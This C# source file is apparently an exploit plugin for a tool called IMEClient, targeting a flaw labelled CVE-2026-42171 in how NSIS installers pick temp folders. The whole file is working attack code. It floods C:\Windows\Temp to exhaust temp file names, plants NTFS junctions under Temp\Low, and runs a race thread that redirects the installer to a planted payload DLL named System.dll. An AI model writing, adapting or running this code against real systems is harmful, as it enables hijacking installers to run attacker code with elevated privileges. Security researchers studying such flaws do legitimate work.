using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace IMEClient.plugins
{
    // CVE-2026-42171: forces NSIS temp fallback to an attacker-controlled junction via GetTempFileName exhaustion.
    internal class NSISTempExhaustion : InstallerPlugin
    {
        static readonly string TempDir = @"C:\Windows\Temp";
        static readonly string TempLowPath = @"C:\Windows\Temp\Low";
        static readonly char[] Prefixes = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        const int SuffixMax = 0xFFFF;
        const int FloodThreads = 8;

        readonly byte[] _payload;
        readonly string _workspace1;
        readonly string _workspace2;
        volatile bool _swapped;
        readonly Thread _racerThread;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint GetTempFileNameW(string lpPathName, string lpPrefixString, uint uUnique, StringBuilder lpTempFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, byte[] lpInBuffer,
            uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const uint GENERIC_WRITE = 0x40000000;
        const uint OPEN_EXISTING = 3;
        const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        const uint FILE_FLAG_OPEN_REPARSE_POINT = 0x00200000;
        const uint FSCTL_SET_REPARSE_POINT = 0x000900A4;
        const uint IO_REPARSE_TAG_MOUNT_POINT = 0xA0000003;

        public NSISTempExhaustion(string[] args) : base(args)
        {
            _payload = NSISPlugin.ReadResource("payload.x86.dll");
            if (_payload.Length == 0)
                throw new InvalidOperationException("Payload resource 'payload.x86.dll' not found.");

            if (IsTempNameSpaceExhausted())
            {
                Console.WriteLine($"[{Name}] Temp namespace already exhausted.");
            }
            else
            {
                Console.WriteLine($"[{Name}] Flooding C:\\Windows\\Temp namespace (this may take several minutes)...");
                FloodTempDir();
            }

            _workspace1 = CreateTempDirectory();
            _workspace2 = CreateTempDirectory();
            File.WriteAllBytes(Path.Combine(_workspace2, "System.dll"), _payload);

            try { Directory.Delete(TempLowPath, true); } catch { }
            Directory.CreateDirectory(TempLowPath);
            CreateJunction(TempLowPath, _workspace1);

            Console.WriteLine($"[{Name}] Workspace: {_workspace1}");
            Console.WriteLine($"[{Name}] Payload:   {Path.Combine(_workspace2, "System.dll")}");
            Console.WriteLine($"[{Name}] Junction:  {TempLowPath} -> {_workspace1}");
            Console.WriteLine($"[{Name}] Ready. Trigger an NSIS install with 'IMEClient install <app> --checkin'.");

            _racerThread = new Thread(RacerLoop) { IsBackground = true, Name = "NSISTempExhaustion-racer" };
            _racerThread.Start();
        }

        public override void OnFileEvent(object sender, FileSystemEventArgs e)
        {
            if (_swapped)
                return;
            if (e.ChangeType != WatcherChangeTypes.Created)
                return;
            if (!e.FullPath.StartsWith(_workspace1 + @"\", StringComparison.OrdinalIgnoreCase) &&
                !e.FullPath.StartsWith(TempLowPath + @"\", StringComparison.OrdinalIgnoreCase))
                return;

            TrySwap();
        }

        void RacerLoop()
        {
            while (!_swapped)
            {
                TrySwap();
            }
        }

        void TrySwap()
        {
            if (_swapped)
                return;

            try
            {
                string[] dirs = Directory.GetDirectories(_workspace1, "*.tmp", SearchOption.TopDirectoryOnly);
                foreach (string tmpDir in dirs)
                {
                    if (!File.Exists(Path.Combine(tmpDir, "System.dll")))
                        continue;

                    string tmpDirName = new DirectoryInfo(tmpDir).Name;
                    string lowTarget = Path.Combine(TempLowPath, tmpDirName);

                    Directory.Delete(TempLowPath);
                    Directory.CreateDirectory(TempLowPath);
                    Directory.CreateDirectory(lowTarget);
                    CreateJunction(lowTarget, _workspace2);

                    _swapped = true;
                    Console.WriteLine($"[{Name}] Swapped: {lowTarget} -> {_workspace2}");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{Name}] Error during swap: {ex.Message}");
            }
        }

        static bool IsTempNameSpaceExhausted()
        {
            if (!File.Exists(Path.Combine(TempDir, "nsa1.tmp")))
                return false;
            var buf = new StringBuilder(260);
            uint result = GetTempFileNameW(TempDir, "nsa", 0, buf);
            if (result != 0)
            {
                try { File.Delete(buf.ToString()); } catch { }
                return false;
            }
            return true;
        }

        static void FloodTempDir()
        {
            long created = 0;
            var sw = Stopwatch.StartNew();

            Parallel.ForEach(Prefixes, new ParallelOptions { MaxDegreeOfParallelism = FloodThreads }, letter =>
            {
                var sb = new StringBuilder(256);
                string prefix = "ns" + letter;

                for (int s = 1; s <= SuffixMax; s++)
                {
                    sb.Clear();
                    sb.Append(TempDir).Append('\\').Append(prefix).Append(s.ToString("X")).Append(".tmp");
                    try
                    {
                        using (File.Open(sb.ToString(), FileMode.CreateNew, FileAccess.Write, FileShare.None)) { }
                        Interlocked.Increment(ref created);
                    }
                    catch { }
                }

                Console.WriteLine($"[NSISTempExhaustion] Prefix {prefix} done.");
            });

            sw.Stop();
            Console.WriteLine($"[NSISTempExhaustion] Created {created:N0} files in {sw.Elapsed.TotalSeconds:F1}s");
        }

        static string CreateTempDirectory()
        {
            string path = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            Directory.CreateDirectory(path);
            return path;
        }

        static void CreateJunction(string junctionDir, string targetDir)
        {
            string targetFull = Path.GetFullPath(targetDir).TrimEnd('\\');
            string subName = @"\??\" + targetFull;
            string printName = targetFull;

            byte[] subBytes = Encoding.Unicode.GetBytes(subName);
            byte[] printBytes = Encoding.Unicode.GetBytes(printName);

            int headerSize = 8 + 8;
            int pathBufSize = subBytes.Length + 2 + printBytes.Length + 2;
            byte[] buf = new byte[headerSize + pathBufSize];

            BitConverter.GetBytes(IO_REPARSE_TAG_MOUNT_POINT).CopyTo(buf, 0);
            BitConverter.GetBytes((ushort)(8 + pathBufSize)).CopyTo(buf, 4);
            BitConverter.GetBytes((ushort)subBytes.Length).CopyTo(buf, 10);
            BitConverter.GetBytes((ushort)(subBytes.Length + 2)).CopyTo(buf, 12);
            BitConverter.GetBytes((ushort)printBytes.Length).CopyTo(buf, 14);
            Array.Copy(subBytes, 0, buf, headerSize, subBytes.Length);
            Array.Copy(printBytes, 0, buf, headerSize + subBytes.Length + 2, printBytes.Length);

            IntPtr h = CreateFileW(junctionDir, GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, IntPtr.Zero);
            if (h == INVALID_HANDLE_VALUE)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            try
            {
                if (!DeviceIoControl(h, FSCTL_SET_REPARSE_POINT, buf, (uint)buf.Length,
                    IntPtr.Zero, 0, out uint ret, IntPtr.Zero))
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }
            finally
            {
                CloseHandle(h);
            }
        }
    }
}